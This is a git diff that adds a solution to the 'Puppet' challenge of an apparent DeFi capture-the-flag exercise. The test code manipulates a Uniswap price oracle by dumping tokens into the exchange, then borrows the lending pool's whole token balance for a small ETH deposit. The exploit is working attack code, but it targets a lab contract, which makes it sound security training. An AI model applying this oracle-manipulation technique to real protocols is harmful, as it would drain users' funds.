@@ -103,6 +103,20 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        let attackerBalance = (await this.token.balanceOf(attacker.address)).sub(1)
+        let ethToBeReceived = calculateTokenToEthInputPrice(attackerBalance, await this.token.balanceOf(this.uniswapExchange.address), await ethers.provider.getBalance(this.uniswapExchange.address))
+
+        let deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        await this.token.connect(attacker).approve(this.uniswapExchange.address,attackerBalance)
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(attackerBalance,1,deadline) // swap (almost) all of the attacker DVT tokens into ETH - this will push down the price of DVT relative to ETH // in practice this needs to be done in a single transaction, otherwise the price will be arbed back
+        
+        let lendingPoolBalance = await this.token.balanceOf(this.lendingPool.address)
+        let ethDepositRequired = await this.lendingPool.calculateDepositRequired(lendingPoolBalance)
+        await this.lendingPool.connect(attacker).borrow(lendingPoolBalance,{value:ethDepositRequired})
+
+        //await this.uniswapExchange.connect(attacker).ethToTokenSwapInput(1,deadline,{value:ethToBeReceived}) // reverting
+
     });
 
     after(async function () {
